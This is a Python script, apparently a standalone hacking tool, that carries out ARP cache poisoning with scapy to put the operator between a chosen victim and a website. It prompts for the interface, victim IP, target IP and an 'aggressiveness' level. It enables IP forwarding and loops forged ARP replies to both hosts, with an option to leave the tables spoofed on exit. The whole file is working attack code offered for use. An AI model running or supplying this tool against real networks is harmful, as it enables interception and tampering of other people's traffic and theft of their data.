import scapy.all as scapy
import logging
import time
import os

class ARPPoison:
    def __init__(self, iface, victimIP, websiteIP):
        self.iface = iface
        self.victimIP = victimIP
        self.websiteIP = websiteIP
    
    def get_mac(self, IP):
        try:
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=IP)
            pkt = scapy.srp(broadcast, iface=self.iface, timeout=2)[0]
            mac = pkt[0][1].hwsrc
        except IndexError:
            print("> Could not find victim IP or interface. Exiting...")
            exit(1)
        return mac
    
    def set_mac(self):
        self.victimMAC = self.get_mac(self.victimIP)
        self.websiteMAC = self.get_mac(self.websiteIP)
    
    def poison(self, target, pretend, MAC):
        # Note: Ignore warning when running, adding Ether 'hwdst' will break the poisoning
        packet = scapy.ARP(op=2, hwdst=MAC, pdst=target, psrc=pretend)
        scapy.send(packet, iface=self.iface)
        print(f"> Poisoning {target} as {pretend}")

    def ip_forward(self, enable):
        if enable:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            print("> IP forwarding enabled.\n")
        else:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("> IP forwarding disabled.\n")
    
    def restore_tables(self, ptarget1, ptarget2, hwt1, hwt2):
        pkt = scapy.ARP(op=2, pdst=ptarget1, hwdst=hwt1, psrc=ptarget2, hwsrc=hwt2)
        scapy.send(pkt, iface=self.iface)
        pkt = scapy.ARP(op=2, pdst=ptarget2, hwdst=hwt2, psrc=ptarget1, hwsrc=hwt1)
        scapy.send(pkt, iface=self.iface)
        print("> ARP tables restored. Exiting...")
        exit(0)
        
    def attack(self):
        self.set_mac()
        self.ip_forward(True)
        while True:
            try:
                self.poison(self.victimIP, self.websiteIP, self.victimMAC)
                self.poison(self.websiteIP, self.victimIP, self.websiteMAC)
                time.sleep(10.5 - timer)
            except KeyboardInterrupt:
                try:
                    self.ip_forward(False)
                    restore = input("> Restore ARP tables? [Y/N] ").strip().lower()
                    if restore == 'y' or restore == 'yes':
                        self.restore_tables(self.victimIP, self.websiteIP, self.victimMAC, self.websiteMAC)
                    else:
                        print("> ARP tables left spoofed. Exiting...")
                        exit(0)
                except KeyboardInterrupt:
                    print("> ARP tables left spoofed. Exiting...")

if __name__ == "__main__":
    scapy.conf.verb = 0
    logging.getLogger("scapy").setLevel(logging.ERROR)
    try:
        iface = input("> Interface: ")
        victim = input("> Victim IP: ")
        site = input("> Website IP: ")
        while True:
            try:
                timer = int(input("> Aggressiveness (1-10): "))
                if 1 <= timer <= 10:
                    break
                else:
                    print(">! Integer must be between 1 and 10.")
            except ValueError:
                print(">! Please enter an integer.")
    except KeyboardInterrupt:
        print("> Poisoning aborted. Exiting...")
        exit(0)

    spoofer = ARPPoison(iface, victim, site)
    spoofer.attack()